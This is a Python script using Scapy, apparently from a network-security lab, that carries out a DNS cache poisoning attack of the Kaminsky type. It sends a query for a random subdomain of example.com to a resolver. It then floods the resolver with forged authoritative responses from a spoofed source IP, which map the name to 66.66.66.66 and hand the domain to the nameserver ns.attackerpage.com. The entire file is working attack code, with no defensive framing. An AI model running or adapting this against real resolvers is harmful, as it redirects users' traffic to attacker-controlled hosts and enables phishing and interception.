from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
import random
import string
import socket
import time

# ============= CONFIGURATION 1: CLIENT (Send DNS Request) =============
CLIENT_CONFIG = {
    "src_ip": "10.11.2.7",
    "dst_ip": "10.11.2.6",
    "dst_port": 53,
    "num_requests": 1
}

# ============= CONFIGURATION 2: RESPONSE (Send DNS Response) =============
RESPONSE_CONFIG = {
    "src_ip": "108.162.195.228",
    "dst_ip": "10.11.2.6",
    "src_port": 53,
    "dst_port": 12345,
    "num_responses": 2
}

# ============= CONFIGURATION 3: NS RECORD (Authority Section) =============
NS_RECORD_CONFIG = {
    "rrname": "example.com",
    "rdata": "ns.attackerpage.com",
    "ttl": 86400
}

# ============= CONFIGURATION 4: A RECORD (Answer Section) =============
A_RECORD_CONFIG = {
    "address": "66.66.66.66",
    "ttl": 86400
}

def generate_random_subdomain():
    """Generate a random subdomain"""
    return ''.join(random.choices(string.ascii_lowercase, k=5))

def generate_random_txid():
    """Generate a random transaction ID (0-65535)"""
    return random.randint(0, 65535)

def build_dns_request(query_name):
    """Build a DNS request packet"""
    src_port = random.randint(10000, 65535)
    txid = generate_random_txid()
    
    packet = IP(src=CLIENT_CONFIG["src_ip"], dst=CLIENT_CONFIG["dst_ip"]) / \
             UDP(sport=src_port, dport=CLIENT_CONFIG["dst_port"]) / \
             DNS(id=txid, rd=1, qd=DNSQR(qname=query_name, qtype="A"))
    
    return bytes(packet)

def build_dns_response(query_name):
    """Build a DNS response packet with A record"""
    txid = generate_random_txid()
    
    # A record for the answer section
    a_record = DNSRR(rrname=query_name, 
                     type="A", 
                     ttl=A_RECORD_CONFIG["ttl"], 
                     rdata=A_RECORD_CONFIG["address"])
    
    # NS record for the authority section
    ns_record = DNSRR(rrname=NS_RECORD_CONFIG["rrname"], 
                      type="NS", 
                      ttl=NS_RECORD_CONFIG["ttl"], 
                      rdata=NS_RECORD_CONFIG["rdata"])
    
    packet = IP(src=RESPONSE_CONFIG["src_ip"], dst=RESPONSE_CONFIG["dst_ip"]) / \
             UDP(sport=RESPONSE_CONFIG["src_port"], dport=RESPONSE_CONFIG["dst_port"]) / \
             DNS(id=txid, qr=1, aa=1, ancount=1, nscount=1,
                 qd=DNSQR(qname=query_name, qtype="A"),
                 an=a_record,
                 ns=ns_record)
    
    return bytes(packet)

def send_raw_packets(packets):
    """Send packets using raw sockets"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    for packet_bytes in packets:
        try:
            sock.sendto(packet_bytes, (CLIENT_CONFIG["dst_ip"], 0))
        except:
            pass
    
    sock.close()

def send_raw_response_packets(packets):
    """Send response packets using raw sockets"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    for packet_bytes in packets:
        try:
            sock.sendto(packet_bytes, (RESPONSE_CONFIG["dst_ip"], 0))
        except:
            pass
    
    sock.close()

def run():
    """Build and send packets for each request with 0.1 second delay"""
    for i in range(CLIENT_CONFIG["num_requests"]):
        request_packets = []
        response_packets = []
        
        # Generate query name for this request
        random_subdomain = generate_random_subdomain()
        query_name = f"{random_subdomain}.example.com"
        
        # Build request packet
        req_packet = build_dns_request(query_name)
        request_packets.append(req_packet)
        
        # Build response packets
        for j in range(RESPONSE_CONFIG["num_responses"]):
            resp_packet = build_dns_response(query_name)
            response_packets.append(resp_packet)
        
        # Send request packets
        send_raw_packets(request_packets)
        
        # Send response packets
        send_raw_response_packets(response_packets)
        
        # Wait 0.1 second before next request/response cycle
        if i < CLIENT_CONFIG["num_requests"] - 1:
            time.sleep(0.1)

# ============= MAIN EXECUTION =============
if __name__ == "__main__":
    run()